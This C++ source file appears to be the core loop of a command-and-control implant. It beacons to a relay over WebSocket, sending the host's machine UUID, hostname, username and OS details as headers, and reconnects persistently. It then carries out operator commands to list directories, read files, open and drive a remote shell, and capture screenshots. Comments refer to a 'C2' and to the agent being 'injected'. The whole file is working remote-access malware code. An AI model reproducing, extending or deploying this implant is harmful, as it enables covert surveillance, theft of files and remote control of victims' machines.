#include "commands.h"
#include "runtime.h"
#include "websocket_client.h"
#include "shell.h"
#include "core/memory/memory.h"
#include "core/string/string.h"
#include "platform/system/environment.h"
#include "platform/system/random.h"
#include "platform/system/system_info.h"

/**
 * Appends a decimal number to the identity header block.
 *
 * @param writer Writer positioned at the current end of the header block.
 * @param value Number to render as decimal digits.
 * @return true if it fit, false if the buffer was exhausted (cursor unchanged).
 */
static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
{
    CHAR buf[24];
    StringUtils::UIntToStr(value, Span<CHAR>(buf, sizeof(buf)));
    return writer.WriteString(buf) != nullptr;
}

/**
 * Builds the identity header block sent with the root (/) WebSocket upgrade (API 1).
 *
 * @details Identity travels as HTTP headers. The relay
 * copies these headers into its agent events and /status; the C2 consumes them as
 * typed fields without parsing anything binary. Two formats must stay stable:
 *  - X-Agent-Machine-Uuid: the machine UUID in its canonical RFC 9562 form
 *    (8-4-4-4-12 lowercase) — the same value the host OS reports for the
 *    machine, so operators can cross-reference host inventories directly.
 *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
 *
 * @param info Populated SystemInfo (the same data the old Hello response carried).
 * @param sessionKey Per-RUNTIME session key (X-Agent-Session-Key): a fresh random UUID
 *        minted once per process launch and reused on every reconnect — it names THIS
 *        runtime, not a connection, so the relay/C2 can tell agent runtimes apart on one
 *        machine while rows stay keyed by the machine uuid. Identifies, authorizes
 *        nothing. Nullptr/empty omits the header (pre-session-key build behavior).
 * @param out Output buffer for CRLF-terminated header lines (no trailing blank line).
 * @return Total header-block length, or 0 if the buffer was too small.
 */
static USIZE BuildIdentityHeaders(const SystemInfo &info, const CHAR *sessionKey, Span<CHAR> out)
{
    const CHAR *hex = "0123456789abcdef";

    BinaryWriter writer{Span<UINT8>((UINT8 *)out.Data(), out.Size())};

    // Fixed 37-byte buffer (36 chars + NUL) — ToString cannot fail.
    CHAR uuid[37];
    (VOID)info.MachineUUID.ToString(Span<CHAR>(uuid, sizeof(uuid)));

    CapabilityMask mask = BuildCapabilityMask();

    // Each append fails cleanly (nullptr, cursor unchanged) when the buffer is
    // too small, so a single ok flag folds every overflow into one result.
    BOOL ok = true;
    ok = ok && writer.WriteString("X-Agent-Api-Version: ") != nullptr && WriteNumber(writer, AGENT_API_VERSION) && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Machine-Uuid: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
    // Per-RUNTIME key — NOT identity: rows stay keyed by the machine uuid above; a fresh
    // value per process launch distinguishes concurrent or succeeding runtimes on one
    // machine (e.g. this agent injected alongside a C# successor).
    if (sessionKey != nullptr && sessionKey[0] != '\0')
        ok = ok && writer.WriteString("X-Agent-Session-Key: ") != nullptr && writer.WriteString(sessionKey) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Hostname: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Username: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Process-Arch: ") != nullptr && writer.WriteString(info.ProcessArchitecture) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Platform: ") != nullptr && writer.WriteString(info.AgentPlatform) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Os-Version: ") != nullptr && writer.WriteString(info.OSVersion) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Build: ") != nullptr && WriteNumber(writer, AGENT_BUILD_NUMBER) && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Commit: ") != nullptr && writer.WriteString(AGENT_COMMIT_HASH) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Name-Id: ") != nullptr && WriteNumber(writer, AGENT_NAME_ID) && writer.WriteString("\r\n") != nullptr;
    // No X-Agent-Bitness header: the process arch header already carries the full
    // width, and x86_64/aarch64 are both 64-bit — a bare bit flag says nothing about
    // which.
    ok = ok && writer.WriteString("X-Agent-Capabilities: ") != nullptr;
    for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
    {
        CHAR byte[3] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF], '\0'};
        ok = writer.WriteString(byte) != nullptr;
    }
    ok = ok && writer.WriteString("\r\n") != nullptr;

    return ok ? writer.GetOffset() : 0;
}

static const CHAR *CommandTypeName(UINT8 type)
{
    switch (type)
    {
    case CommandType::Command_GetDirectoryContent:
        return "GetDirectoryContent";
    case CommandType::Command_GetFileContent:
        return "GetFileContent";
    case CommandType::Command_GetFileChunkHash:
        return "GetFileChunkHash";
    case CommandType::Command_WriteShell:
        return "WriteShell";
    case CommandType::Command_ReadShell:
        return "ReadShell";
    case CommandType::Command_GetDisplays:
        return "GetDisplays";
    case CommandType::Command_GetScreenshot:
        return "GetScreenshot";
    case CommandType::Command_CloseShell:
        return "CloseShell";
    case CommandType::Command_Exit:
        return "Exit";
    case CommandType::Command_OpenShell:
        return "OpenShell";
    default:
        return "Unknown";
    }
}

INT32 start()
{
    // Resolve the relay URL from the W_URL environment variable at runtime.
    // There is no fallback: the agent will not run without an explicit endpoint.
    CHAR urlBuffer[512];
    USIZE urlLen = Environment::GetVariable("W_URL", Span<CHAR>(urlBuffer, sizeof(urlBuffer)));
    if (urlLen == 0)
    {
        LOG_ERROR("W_URL environment variable is not set; cannot start agent without a relay endpoint");
        return 0;
    }
    Span<const CHAR> urlSpan(urlBuffer, urlLen); // exclude null terminator (ParseUrl bounds on Span size)

    Context context;
    UINT32 connectionAttempt = 0;

    CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
    // Core (mandatory, always registered)
    commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
#if SUPPORT_FILESYSTEM
    commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
    commandHandlers[CommandType::Command_GetFileContent]      = Handle_GetFileContentCommand;
    commandHandlers[CommandType::Command_GetFileChunkHash]    = Handle_GetFileChunkHashCommand;
#endif
#if SUPPORT_SHELL
    commandHandlers[CommandType::Command_OpenShell]  = Handle_OpenShellCommand;
    commandHandlers[CommandType::Command_CloseShell] = Handle_CloseShellCommand;
    commandHandlers[CommandType::Command_ReadShell]  = Handle_ReadShellCommand;
    commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
#endif
#if SUPPORT_DISPLAY
    commandHandlers[CommandType::Command_GetDisplays]   = Handle_GetDisplaysCommand;
    commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
#endif

    LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);

    // Per-RUNTIME session key: minted ONCE per launch, reused on every reconnect below —
    // it names THIS runtime, not a connection (see BuildIdentityHeaders). A v4 UUID from
    // the hardware-seeded PRNG; uniqueness is all that matters — it identifies,
    // authorizes nothing.
    Random random;
    CHAR sessionKey[37];
    sessionKey[0] = '\0';
    (VOID)random.RandomUUID().ToString(Span<CHAR>(sessionKey, sizeof(sessionKey)));

    while (!context.shouldExit)
    {
        connectionAttempt++;
        LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)urlBuffer);

        // Identity rides the upgrade request as HTTP headers (API 1) — no Hello
        // frame. Built fresh per connection so a changed hostname/user follows
        // the reconnect. The session key is the exception: generated once above,
        // it rides every reconnect unchanged.
        SystemInfo identityInfo;
        GetSystemInfo(&identityInfo);
        CHAR identityHeaders[1024];
        USIZE identityHeadersLen = BuildIdentityHeaders(identityInfo, sessionKey, Span<CHAR>(identityHeaders, sizeof(identityHeaders)));
        if (identityHeadersLen == 0)
        {
            LOG_ERROR("Identity header block does not fit (attempt #%u)", connectionAttempt);
            return 0;
        }

        auto createResult = WebSocketClient::Create(urlSpan, Span<const CHAR>(identityHeaders, identityHeadersLen));
        if (!createResult)
        {
            LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)urlBuffer);
            return 0;
        }
        WebSocketClient &wsClient = createResult.Value();
        LOG_INFO("WebSocket connection established (attempt #%u) to %s (identity sent in upgrade headers)",
                 connectionAttempt, (PCCHAR)urlBuffer);

        UINT32 messageCount = 0;
        while (!context.shouldExit)
        {
            LOG_DEBUG("Waiting for next WebSocket message...");
            auto readResult = wsClient.Read();
            if (!readResult)
            {
                LOG_ERROR("WebSocket read failed after %u messages processed, reconnecting...", messageCount);
                break;
            }
            if (readResult.Value().Length < sizeof(UINT8))
            {
                LOG_ERROR("WebSocket received empty/undersized message (%u bytes), reconnecting...",
                          (UINT32)readResult.Value().Length);
                break;
            }

            messageCount++;
            PCHAR command = (PCHAR)(readResult.Value().Data);
            UINT8 commandType = command[0];
            command++;
            USIZE commandLength = readResult.Value().Length - sizeof(UINT8);

            // Correlation id: every command arrives as [opcode][corrId:u32le][payload...].
            // Strip it here (handlers see only their historical payload) and echo it in the
            // reply after the status: [status:u32le][corrId:u32le][body...]. Id 0 means
            // unmatched/absent — echoed verbatim.
            UINT32 correlationId = 0;
            if (commandLength >= sizeof(UINT32))
            {
                Memory::Copy(&correlationId, command, sizeof(correlationId));
                command += sizeof(UINT32);
                commandLength -= sizeof(UINT32);
            }

            LOG_INFO("Message #%u received: command=%s (0x%02x), payload_length=%u, ws_opcode=%d",
                     messageCount, CommandTypeName(commandType), (UINT32)commandType,
                     (UINT32)commandLength, (INT32)readResult.Value().Opcode);

            PCHAR response = nullptr;
            USIZE responseLength = sizeof(UINT32);

            if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
            {
                LOG_DEBUG("Dispatching command %s to handler", CommandTypeName(commandType));
                commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
                if (response == nullptr)
                {
                    LOG_ERROR("Command %s produced no response buffer (allocation failure), reconnecting...",
                              CommandTypeName(commandType));
                    break;
                }
                UINT32 statusCode = *(PUINT32)response;
                LOG_INFO("Command %s completed: status=%u, response_length=%u",
                         CommandTypeName(commandType), statusCode, (UINT32)responseLength);
            }
            else
            {
                LOG_ERROR("Unknown command type 0x%02x received (max valid: 0x%02x), returning StatusUnknownCommand",
                          (UINT32)commandType, (UINT32)(CommandType::CommandTypeCount - 1));
                response = new CHAR[responseLength];
                if (response == nullptr)
                {
                    LOG_ERROR("Failed to allocate the unknown-command response, reconnecting...");
                    break;
                }
                *(PUINT32)response = StatusCode::StatusUnknownCommand;
            }

            // Splice the echoed correlation id between status and body so every handler's
            // response layout stays untouched.
            {
                PCHAR wire = new CHAR[responseLength + sizeof(UINT32)];
                if (wire == nullptr)
                {
                    LOG_ERROR("Failed to allocate the wire buffer for %s response, reconnecting...",
                              CommandTypeName(commandType));
                    delete[] response;
                    break;
                }
                Memory::Copy(wire, response, sizeof(UINT32));
                Memory::Copy(wire + sizeof(UINT32), &correlationId, sizeof(correlationId));
                if (responseLength > sizeof(UINT32))
                    Memory::Copy(wire + sizeof(UINT32) + sizeof(UINT32),
                                 response + sizeof(UINT32), responseLength - sizeof(UINT32));
                delete[] response;
                response = wire;
                responseLength += sizeof(UINT32);
            }

            LOG_DEBUG("Sending response (%u bytes) to server", (UINT32)responseLength);
            auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
            delete[] response;

            if (!writeResult)
            {
                LOG_ERROR("Failed to send response for command %s, reconnecting...", CommandTypeName(commandType));
                break;
            }
            LOG_INFO("Response sent successfully for command %s (%u bytes)", CommandTypeName(commandType), (UINT32)responseLength);
        }

        LOG_WARNING("WebSocket session ended after %u messages, will attempt reconnection", messageCount);
    }
    return 1;
}
